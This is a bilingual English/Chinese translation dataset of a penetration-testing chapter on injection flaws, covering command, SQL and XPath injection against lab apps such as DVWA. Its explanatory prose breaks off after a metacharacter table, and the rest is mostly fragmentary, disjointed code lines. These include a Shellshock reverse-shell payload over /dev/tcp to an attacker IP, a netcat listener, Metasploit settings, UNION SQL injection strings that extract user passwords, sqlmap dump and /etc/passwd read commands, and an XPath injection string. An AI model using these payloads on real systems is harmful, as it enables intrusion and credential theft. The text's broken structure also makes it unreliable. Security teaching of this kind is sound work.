- en: Detecting and Exploiting Injection-Based Flaws
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 检测和利用基于注入的缺陷
- en: According to the OWASP Top 10 2013 list ([https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)), the
    most critical flaw in web applications is the injection flaw, and it has maintained
    its position in the 2017 list
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 根据OWASP Top 10 2013列表([https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10))，Web应用程序中最关键的缺陷是注入漏洞，并且它在2017年的列表中保持了其位置。
- en: ([https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10))
    release candidate. Interactive web applications take the input from the user,
    process it, and return the output to the client. When the application is vulnerable
    to an injection flaw, it accepts the input from the user without proper or even
    with any validation and still processes it. This results in actions that the application
    did not intend to perform. The malicious input tricks the application, forcing
    the underlying components to perform tasks for which the application was not programmed.
    In other words, an injection flaw allows the attacker to control components of
    the application at will.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: ([https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10))
    发布候选版。交互式Web应用程序接受用户输入，处理它，并将输出返回给客户端。当应用程序容易受到注入漏洞时，它接受用户的输入而不进行适当或任何验证，并继续处理。这导致应用程序不打算执行的操作。恶意输入欺骗应用程序，迫使底层组件执行应用程序未编程的任务。换句话说，注入漏洞允许攻击者随意控制应用程序的组件。
- en: 'In this chapter, we will discuss the major injection flaws in today''s web
    applications, including tools to detect and exploit them, and how to avoid being
    vulnerable or to fix existing flaws. These flaws include the following:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将讨论当今Web应用程序中的主要注入漏洞，包括检测和利用它们的工具，以及如何避免易受攻击或修复现有缺陷。这些缺陷包括以下内容：
- en: Command injection flaw
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 命令注入漏洞
- en: SQL injection flaw
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: SQL注入漏洞
- en: XML-based injections
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 基于XML的注入
- en: NoSQL injections
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: NoSQL注入
- en: 'An injection flaw is used to gain access to the underlying component to which
    the application is sending data, to execute some task. The following table shows
    the most common components used by web applications that are often targeted by
    an injection attack when the input from the user is not sanitized by the application:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 注入漏洞用于访问应用程序发送数据的底层组件，以执行某些任务。以下表格显示了Web应用程序常用的最常见组件，当用户输入未经应用程序验证时，这些组件经常成为注入攻击的目标：
- en: '| **Components** | **Injection flaws** |'
  id: totrans-9
  prefs: []
  type: TYPE_TB
  zh: '| **组件** | **注入漏洞** |'
- en: '| --- | --- |'
  id: totrans-10
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| Operating system | Command injection |'
  id: totrans-11
  prefs: []
  type: TYPE_TB
  zh: '| 操作系统 | 命令注入 |'
- en: '| Database | SQL/NoSQL injection |'
  id: totrans-12
  prefs: []
  type: TYPE_TB
  zh: '| 数据库 | SQL/NoSQL注入 |'
- en: '| Web browser / client | Cross-Site Scripting |'
  id: totrans-13
  prefs: []
  type: TYPE_TB
  zh: '| Web浏览器/客户端 | 跨站脚本攻击 |'
- en: '| LDAP directory | LDAP injection |'
  id: totrans-14
  prefs: []
  type: TYPE_TB
  zh: '| LDAP目录 | LDAP注入 |'
- en: '| XML | XPATH / XML External Entity injection |'
  id: totrans-15
  prefs: []
  type: TYPE_TB
  zh: '| XML | XPATH / XML外部实体注入 |'
- en: Command injection
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 命令注入
- en: Web applications, which are dynamic in nature, may use scripts to invoke some
    functionality within the operating system on the web server to process the input
    received from the user. An attacker may try to get this input processed at the
    command line by circumventing the input validation filters implemented by the
    application. **Command injection** usually invokes commands on the same web server,
    but it is possible that the command can be executed on a different server, depending
    on the architecture of the application.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 动态性质的Web应用程序可能使用脚本在Web服务器上调用某些功能，以处理从用户接收到的输入。攻击者可能会尝试通过绕过应用程序实施的输入验证过滤器来在命令行中处理此输入。**命令注入**通常在同一Web服务器上调用命令，但根据应用程序的架构，也可能在不同的服务器上执行命令。
- en: 'Let''s take a look at a simple code snippet, that is vulnerable to a command
    injection flaw, taken from DVWA''s command injection exercise. It is a very simple
    script that receives an IP address and sends pings (ICMP packets) to that address:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看一个简单的代码片段，它容易受到命令注入漏洞的攻击，来自DVWA的命令注入练习。这是一个非常简单的脚本，接收一个IP地址并向该地址发送ping（ICMP数据包）：
- en: '[PRE0]'
  id: totrans-19
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: As you can see, there is no input validation before accepting the `ip` parameter
    from the user, which makes this code vulnerable to a command injection attack.
    To log in to DVWA, the default credentials are `admin`/`admin`.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您所看到的，在从用户接受`ip`参数之前，没有进行输入验证，这使得此代码容易受到命令注入攻击。要登录到DVWA，使用的默认凭据是`admin`/`admin`。
- en: 'A malicious user might use the following request to pipe in additional commands,
    which the application would accept without raising an exception:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意用户可以使用以下请求来注入附加命令，应用程序将接受而不引发异常：
- en: '[PRE1]'
  id: totrans-22
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'The application takes the value of the user input from the client without validation
    and concatenates it to the `ping -c 3` command in order to build the final command
    that is run on the web server. The response from the server is shown in the following
    screenshot. The version of the underlying OS is displayed along with the result
    of pinging the given address as the application failed to validate the user input:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 应用程序从客户端接受用户输入的值而不进行验证，并将其连接到`ping -c 3`命令，以构建在Web服务器上运行的最终命令。服务器的响应显示在以下屏幕截图中。由于应用程序未能验证用户输入，显示了底层操作系统的版本以及对给定地址进行ping的结果：
- en: '![](img/00116.jpeg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![](img/00116.jpeg)'
- en: The additional command injected will run using the privileges of the web server.
    Most web servers nowadays run with restricted privileges, but even with limited
    rights, the attacker can exploit and steal significant information.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 注入的附加命令将使用Web服务器的权限运行。现在大多数Web服务器都以受限权限运行，但即使权限有限，攻击者也可以利用并窃取重要信息。
- en: Command injection can be used to make the server download and execute malicious
    files by injecting the `wget` commands, or to gain a remote shell to the server,
    as demonstrated in the following example.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 命令注入可以用于通过注入`wget`命令使服务器下载和执行恶意文件，或者通过以下示例演示的方式获得对服务器的远程shell。
- en: 'First, set up a listener in Kali Linux. **Netcat** has a very simple way of
    doing this:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，在Kali Linux中设置一个监听器。**Netcat**有一种非常简单的方法来做到这一点：
- en: '[PRE2]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Kali Linux is now set to listen for a connection on port `12345`. Next, inject
    the following command into the vulnerable server:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: Kali Linux现在已设置为在端口`12345`上监听连接。接下来，将以下命令注入到受漏洞的服务器中：
- en: '[PRE3]'
  id: totrans-30
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: On some modern Linux systems, the original Netcat has been replaced by a version
    that doesn't include some options that may have posed a security risk, such as
    `-e`, which allows the execution of commands upon connection. These systems often
    include the traditional version of Netcat in a command called `nc.traditional`.
    When trying to use Netcat to gain access to a remote system, try both options.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 在一些现代Linux系统中，原始的Netcat已被替换为不包含某些可能存在安全风险的选项的版本，例如允许在连接时执行命令的`-e`选项。这些系统通常在名为`nc.traditional`的命令中包含传统版本的Netcat。在尝试使用Netcat访问远程系统时，请尝试这两个选项。
- en: 'Notice that `10.7.7.4` is the IP address of the Kali machine in the example,
    and `12345` is the TCP port listening for the connection. After sending the request,
    you should receive the connection in your Kali Linux and be able to issue commands
    in a noninteractive shell:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，`10.7.7.4`是示例中Kali机器的IP地址，`12345`是用于监听连接的TCP端口。发送请求后，您应该在Kali Linux中接收到连接，并能够在非交互式shell中发出命令：
- en: '![](img/00117.jpeg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![](img/00117.jpeg)'
- en: A noninteractive shell allows you to execute commands and see the results, but
    not interact with the commands nor see the error output, such as when using a
    text editor.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 非交互式shell允许您执行命令并查看结果，但无法与命令进行交互，也无法查看错误输出，例如使用文本编辑器时。
- en: Identifying parameters to inject data
  id: totrans-35
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 识别注入数据的参数
- en: 'When you are testing a web application for command injection flaws, and you
    have confirmed that the application is interacting with the command line of the
    underlying OS, the next step is to manipulate and probe the different parameters
    in the application and view their responses. The following parameters should be
    tested for command injection flaws as the application may be using one of these
    parameters to build a command back on the web server:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 当您测试Web应用程序的命令注入漏洞，并确认应用程序正在与底层操作系统的命令行交互时，下一步是操纵和探测应用程序中的不同参数，并查看它们的响应。应该测试以下参数是否存在命令注入漏洞，因为应用程序可能使用其中一个参数在Web服务器上构建命令：
- en: '**GET**: With this method, input parameters are sent in URLs. In the example
    shown earlier, the input from the client was passed to the server using the `GET`
    method and was vulnerable to a command injection flaw. Any user-controlled parameter
    sent using the `GET` method request should be tested.'
  id: totrans-37
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**GET**：使用此方法，输入参数通过URL发送。在之前的示例中，客户端的输入使用`GET`方法传递给服务器，并且容易受到命令注入漏洞的攻击。应该测试使用`GET`方法请求发送的任何用户可控参数。'
- en: '**POST**: In this method, the input parameters are sent in the HTTP body. Similar
    to the input being passed using the `GET` method; data taken from the end user
    can also be passed using the `POST` method in the body of the HTTP request. This
    could then be used by the web application to build a command query on the server
    side.'
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**POST**：在此方法中，输入参数通过HTTP正文发送。类似于使用`GET`方法传递的输入；从最终用户获取的数据也可以使用`POST`方法在HTTP请求的正文中传递。然后，Web应用程序可以使用这些数据在服务器端构建命令查询。'
- en: '**HTTP header**: Applications often use header fields to identify end users
    and display customized information to the user depending on the value in the headers.
    These parameters can also be used by the application to build further queries.
    Some of the important header fields to check for command injection are as follows:'
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**HTTP头部**：应用程序通常使用头字段来识别最终用户，并根据头部的值向用户显示定制信息。这些参数也可以被应用程序用于构建进一步的查询。检查命令注入的一些重要头字段如下：'
- en: '`Cookies`'
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Cookies`'
- en: '`X-Forwarded-For`'
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`X-Forwarded-For`'
- en: '`User-Agent`'
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`User-Agent`'
- en: '`Referrer`'
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Referrer`'
- en: Error-based and blind command injection
  id: totrans-44
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 基于错误和盲注命令注入
- en: When you piggyback a command through an input parameter and the output of the
    command is displayed in the web browser, it becomes easy to identify whether the
    application is vulnerable to a command injection flaw. The output may be in the
    form of an error or the actual result of the command that you tried to run. As
    a penetration tester, you would then modify and add additional commands, depending
    on the shell the application is using, and glean information from the application.
    When the output is displayed in a web browser, it is known as **error-based**
    or **non-blind command injection**.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 当通过输入参数传递命令并在Web浏览器中显示命令的输出时，很容易确定应用程序是否容易受到命令注入漏洞的攻击。输出可能是错误信息或您尝试运行的命令的实际结果。作为渗透测试人员，您将根据应用程序使用的shell修改和添加其他命令，并从应用程序中获取信息。当输出在Web浏览器中显示时，称为**基于错误的**或**非盲注命令注入**。
- en: In the other form of command injection, that is, **blind command injection**,
    the results of the commands that you inject are not displayed to the user and
    no error messages are returned. The attacker will have to rely on other ways to
    identify whether the command was indeed executed on the server. When the output
    of the command is displayed to the user, you can use any of the bash shell or
    Windows commands, such as `ls`, `dir`, `ps`, or `tasklist`, depending on the underlying
    OS. However, when testing for blind injection, you need to select your commands
    carefully. As an ethical hacker, the most reliable and safe way to identify the
    existence of injection flaws when the application does not display the results
    is with the `ping` command.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 在另一种形式的命令注入中，即**盲注命令注入**，您注入的命令的结果不会显示给用户，也不会返回错误消息。攻击者将不得不依赖其他方式来确定命令是否确实在服务器上执行。当命令的输出显示给用户时，您可以使用任何bash
    shell或Windows命令，例如`ls`、`dir`、`ps`或`tasklist`，具体取决于底层操作系统。然而，在测试盲注时，您需要谨慎选择命令。作为道德黑客，当应用程序不显示结果时，识别注入漏洞存在的最可靠和安全的方法是使用`ping`命令。
- en: 'The attacker injects the `ping` command to send network packets to a machine
    under their control and views the results on that machine using a packet capture.
    This may prove to be useful in several ways:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者通过注入`ping`命令将网络数据包发送到他们控制的机器上，并使用数据包捕获在该机器上查看结果。这可能在以下几个方面证明有用：
- en: Since the `ping` command is similar in both Linux and Windows except for a few
    minor changes, the command is sure to run if the application is vulnerable to
    an injection flaw.
  id: totrans-48
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 由于`ping`命令在Linux和Windows中都相似，除了一些细微的差异，如果应用程序容易受到注入漏洞的影响，该命令肯定会运行。
- en: By analyzing the response in the `ping` output, the attacker can also identify
    the underlying OS using the TTL values.
  id: totrans-49
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过分析`ping`输出中的响应，攻击者还可以使用TTL值识别底层操作系统。
- en: The response in the `ping` output may also give the attacker some insight on
    the firewall and its rules, as the target environment is allowing ICMP packets
    through its firewall. This may prove to be useful in the later stages of exploitation,
    as the web server has a route to the attacker.
  id: totrans-50
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ping`输出中的响应还可以使攻击者了解防火墙及其规则，因为目标环境允许ICMP数据包通过其防火墙。这可能在后期的利用阶段证明有用，因为Web服务器与攻击者之间有一条路径。'
- en: The `ping` utility is usually not restricted; even if the application is running
    under a nonprivileged account, your chances of getting the command executed is
    guaranteed.
  id: totrans-51
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ping`实用程序通常不受限制；即使应用程序在非特权帐户下运行，您执行命令的机会也是有保证的。'
- en: The input buffer is often limited in size and can only accept a finite number
    of characters, for example, the input field for the username. The `ping` command,
    along with the IP addresses and some additional arguments, can easily be injected
    into these fields.
  id: totrans-52
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 输入缓冲区的大小通常是有限的，只能接受有限数量的字符，例如用户名输入字段。`ping`命令以及IP地址和一些附加参数可以轻松注入到这些字段中。
- en: Metacharacters for command separator
  id: totrans-53
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 用于命令分隔符的元字符
- en: In the examples shown earlier, the semicolon was used as a metacharacter, which
    separates the actual input and the command that you are trying to inject. Along
    with the semicolon, there are several other metacharacters that can be used to
    inject commands.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的示例中，分号被用作元字符，它分隔了实际输入和您尝试注入的命令。除了分号之外，还有几个其他元字符可用于注入命令。
- en: 'The developer may set filters to block the semicolon metacharacter. This would
    block your injected data, and therefore you need to experiment with other metacharacters
    too, as shown in the following table:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 开发人员可能设置过滤器以阻止分号元字符。这将阻止您的注入数据，因此您还需要尝试其他元字符，如下表所示：
- en: '| **Symbol** | **Usage** |'
  id: totrans-56
  prefs: []
  type: TYPE_TB
  zh: '| **符号** | **用法** |'
- en: '| --- | --- |'
  id: totrans-57
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| `;` | The semicolon is the most common metacharacter used to test an injection
    flaw. The shell runs all of the commands in sequence separated by the semicolon.
    |'
  id: totrans-58
  prefs: []
  type: TYPE_TB
  zh: '| `;` | 分号是最常用的元字符，用于测试注入漏洞。Shell按顺序运行所有命令，以分号分隔。 |'
- en: '| `&&` | The double ampersand runs the command to the right of the metacharacter
    only if the command to the left executed successfully.An example would be to inject
    the password field along with the correct credentials. A command can be injected
    that will run once the user is authenticated to the system. |'
  id: totrans-59
  prefs: []
  type: TYPE_TB
  zh: '| `&&` | 双与运算符仅在左侧命令成功执行时才运行右侧命令。例如，可以注入密码字段以及正确的凭据。一旦用户通过身份验证进入系统，就可以运行注入的命令。
    |'
- en: '| `&#124;&#124;` | The double pipe metacharacter is the direct opposite of
    the double ampersand. It runs the command on the right-hand side only if the command
    on the left-hand side failed. The following is an example of this command: `**cd
    invalidDir &#124;&#124; ping -c 2 attacker.com**` |'
  id: totrans-60
  prefs: []
  type: TYPE_TB
  zh: '| `&#124;&#124;` | 双管道元字符是双与元字符的直接相反。它仅在左侧命令失败时才运行右侧命令。以下是此命令的示例：`**cd invalidDir
    &#124;&#124; ping -c 2 attacker.com**` |'
- en: '| `( )` | Using the grouping metacharacter, you can combine the outputs of
    multiple commands and store them in a file. The following is an example of this
    command: `**(ps; netstat) > running.txt**` |'
  id: totrans-61
  prefs: []
  type: TYPE_TB
  zh: '| `( )` | 使用分组元字符，您可以将多个命令的输出组合并存储在文件中。以下是此命令的示例：`**(ps; netstat) > running.txt**`
    |'
- en: '| [PRE4]'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: '| [PRE4]'
- en: () { :; };
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: () { :; };
- en: '[PRE5]'
  id: totrans-64
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: () { :;}; ping -c 1 192.168.1.1
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; ping -c 1 192.168.1.1
- en: () { :;}; /bin/ping -c 1 192.168.1.1
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; /bin/ping -c 1 192.168.1.1
- en: () { :;}; bash -c "ping -c 1 192.168.1.1"
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; bash -c "ping -c 1 192.168.1.1"
- en: () { :;}; /bin/bash -c "ping -c 1 attacker.com"
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; /bin/bash -c "ping -c 1 attacker.com"
- en: () { :;}; /bin/sh -c "ping -c 1 192.168.1.1"
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; /bin/sh -c "ping -c 1 192.168.1.1"
- en: '[PRE6]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: nc -lvp 12345
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: nc -lvp 12345
- en: '[PRE7]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: () { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345
    0>&1"
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: () { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345
    0>&1"
- en: '[PRE8]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: use exploit/multi/http/apache_mod_cgi_bash_env_exec
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: use exploit/multi/http/apache_mod_cgi_bash_env_exec
- en: '[PRE9]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: set SRVHOST 0.0.0.0
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: set SRVHOST 0.0.0.0
- en: set SRVPORT 8080
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: set SRVPORT 8080
- en: '[PRE10]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: SELECT [elements] FROM [table] WHERE [condition]
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: SELECT [元素] FROM [表] WHERE [条件]
- en: '[PRE11]'
  id: totrans-81
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: SELECT name,description,price FROM products WHERE price<100
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: SELECT name,description,price FROM products WHERE price<100
- en: '[PRE12]'
  id: totrans-83
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;
- en: '[PRE13]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: <?php
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: <?php
- en: $stockID = $_GET["userinput"];
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: $stockID = $_GET["userinput"];
- en: $SQL= "SELECT * FROM books WHERE ID=" . $stockID;
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: $SQL= "SELECT * FROM books WHERE ID=" . $stockID;
- en: $result= MySQL_query($SQL);
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: $result= MySQL_query($SQL);
- en: $row = MySQL_fetch_assoc($result);
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: $row = MySQL_fetch_assoc($result);
- en: ?>
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: ?>
- en: '[PRE14]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: SELECT * FROM books WHERE ID=10-1
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: SELECT * FROM books WHERE ID=10-1
- en: '[PRE15]'
  id: totrans-94
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: SELECT first_name, last_name FROM users WHERE user_id = '''
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: SELECT first_name, last_name FROM users WHERE user_id = '''
- en: '[PRE16]'
  id: totrans-96
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: '"SELECT first_name, last_name FROM users WHERE first_name LIKE ''" .'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '"SELECT first_name, last_name FROM users WHERE first_name LIKE ''" .'
- en: $name . "'"
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: $name . "'"
- en: '[PRE17]'
  id: totrans-99
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
- en: '[PRE18]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' -- '
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' -- '
- en: '[PRE19]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' and table_name = 'users' --'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' and table_name = 'users' --'
- en: '[PRE20]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password)
    from dvwa.users -- '
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password)
    from dvwa.users -- '
- en: '[PRE21]'
  id: totrans-107
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 1' and database()='dvwa
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 1' and database()='dvwa
- en: '[PRE22]'
  id: totrans-109
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 1'+and+char_length(database())=1+--+'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 1'+and+char_length(database())=1+--+'
- en: '[PRE23]'
  id: totrans-111
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: sqlninja -f <path to config file > -m m
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: sqlninja -f <path to config file > -m m
- en: '[PRE24]'
  id: totrans-113
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --schema
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --schema
- en: '[PRE25]'
  id: totrans-115
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: sqlmap -r bodgeit_login.txt -p username --current-db --current-user --threads
    5
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap -r bodgeit_login.txt -p username --current-db --current-user --threads
    5
- en: '[PRE26]'
  id: totrans-117
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public --tables
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public --tables
- en: '[PRE27]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public -T users -dump
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public -T users -dump
- en: '[PRE28]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --file-read /etc/passwd
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --file-read /etc/passwd
- en: '[PRE29]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: <rootNode>
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: <rootNode>
- en: <childNode>
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: <childNode>
- en: <element/>
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: <element/>
- en: </childNode>
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: </childNode>
- en: </rootNode>
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: </rootNode>
- en: '[PRE30]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: /rootNode/childNode/element
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: /rootNode/childNode/element
- en: '[PRE31]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: //Employee[UserName/text()='myuser' And Password/text()='mypassword']
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: //Employee[UserName/text()='myuser' And Password/text()='mypassword']
- en: '[PRE32]'
  id: totrans-133
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: '.../node[contains(genre, ''$genre_input'')]/node...'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '.../node[contains(genre, ''$genre_input'')]/node...'
- en: '[PRE33]'
  id: totrans-135
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: ''')]/*|//*[contains(''1'',''1'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: ''')]/*|//*[contains(''1'',''1'
- en: '[PRE34]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: apt-get install python3-pip
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: apt-get install python3-pip
- en: pip3 install xcat
  id: totrans-139
  prefs: []
